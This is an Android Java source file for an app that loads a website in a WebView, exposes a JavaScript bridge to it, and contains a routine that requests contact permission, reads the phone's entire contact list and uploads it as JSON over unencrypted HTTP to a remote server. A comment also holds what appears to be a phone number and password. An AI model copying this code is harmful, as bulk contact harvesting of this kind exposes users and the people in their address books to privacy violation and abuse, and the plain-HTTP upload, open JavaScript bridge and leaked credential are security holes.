package com.tutu.susuhua;

import android.Manifest;
import android.os.Build;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.view.KeyEvent;
import android.widget.LinearLayout;
import android.widget.Toast;

import com.just.library.AgentWeb;
import com.lzy.okgo.OkGo;
import com.lzy.okgo.callback.StringCallback;
import com.lzy.okgo.model.Response;
import com.tbruyelle.rxpermissions2.RxPermissions;
import com.tutu.susuhua.beana.JumpEvent;
import com.tutu.susuhua.contact.ContactGetHelper;
import com.tutu.susuhua.rxbus.RxBus2;

import java.util.HashMap;
import java.util.Map;

import io.reactivex.functions.Consumer;

import static android.os.Build.VERSION_CODES.M;

public class MainActivity extends AppCompatActivity {
    //private WebView mWebView;
    private AgentWeb mAgentWeb;
    private LinearLayout parent;

//15116318447   zxc123

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        //mWebView = (WebView) findViewById(R.id.webview);
        parent = (LinearLayout) findViewById(R.id.parent);


        mAgentWeb = AgentWeb.with(this)//传入Activity
                .setAgentWebParent(parent, new LinearLayout.LayoutParams(-1, -1))
                .useDefaultIndicator()// 使用默认进度条
                .defaultProgressBarColor() // 使用默认进度条颜色
                //.setReceivedTitleCallback(mCallback) //设置 Web 页面的 title 回调
                .createAgentWeb()//
                .ready()
                .go("http://www.kayouxiang.com/mobile/index.htm");

//        findViewById(R.id.btn).setOnClickListener(new View.OnClickListener() {
//            @Override
//            public void onClick(View view) {
//                requestPermission();
//            }
//        });

        mAgentWeb.getJsInterfaceHolder().addJavaObject("js", new JavaScriptInterface(this));
        RxBus2.getDefault().toFlowable(JumpEvent.class)
                .subscribe(new Consumer<JumpEvent>() {
                    @Override
                    public void accept(JumpEvent jumpEvent) throws Exception {
                        mAgentWeb.getWebCreator().create().get().loadUrl(jumpEvent.getUrl());
//                        mAgentWeb.getLoader().loadUrl(jumpEvent.getUrl());
                    }
                });
    }

    private void requestPermission() {
        RxPermissions rxPermissions = new RxPermissions(MainActivity.this);
        if (Build.VERSION.SDK_INT >= M) {
            rxPermissions.request(
                    Manifest.permission.READ_CONTACTS
            )
                    .subscribe(new io.reactivex.functions.Consumer<Boolean>() {
                        @Override
                        public void accept(Boolean aBoolean) throws Exception {
                            if (aBoolean) {
                                request();
                            } else {
                                Toast.makeText(App.app, "没有获取到需要的权限", Toast.LENGTH_SHORT).show();
                                finish();
                            }
                        }
                    });
        }
    }

    private void request() {
        Map<String, String> params = new HashMap<>();
        params.put("card", "2");
        params.put("datas", GsonUtils.listToJson(new ContactGetHelper().getContacts(App.app)));


        OkGo.<String>post("http://www.kayouxiang.com/submits")
                .tag(this)
                .params(params)
                .execute(new StringCallback() {
                    @Override
                    public void onSuccess(Response<String> response) {

                        ResponBean responBean = GsonUtils.jsonToObj(response.body().toString(), ResponBean.class);
                        if ("3".equals(responBean.getStruts())) {
                            Toast.makeText(App.app, "操作成功", Toast.LENGTH_SHORT).show();
                        } else {
                            Toast.makeText(App.app, "上传失败,失败码=" + responBean.getStruts(), Toast.LENGTH_LONG).show();
                        }
                    }

                    @Override
                    public void onError(Response<String> response) {
                        super.onError(response);
                    }
                });
    }


    @Override
    protected void onPause() {
        mAgentWeb.getWebLifeCycle().onPause();
        super.onPause();

    }

    @Override
    protected void onResume() {
        mAgentWeb.getWebLifeCycle().onResume();
        super.onResume();
    }


    private long firstTime = 0;


    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {

        if (mAgentWeb.handleKeyEvent(keyCode, event)) {
            return true;
        }

//        long secondTime = System.currentTimeMillis();
//        if (keyCode == KeyEvent.KEYCODE_BACK) {
//            if (secondTime - firstTime < 2000) {
//                finish();
//            } else {
//                Toast.makeText(App.app, "再按一次退出程序", Toast.LENGTH_SHORT).show();
//                firstTime = System.currentTimeMillis();
//            }
//            return true;
//        }


        return super.onKeyDown(keyCode, event);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        mAgentWeb.getWebLifeCycle().onDestroy();
    }
}
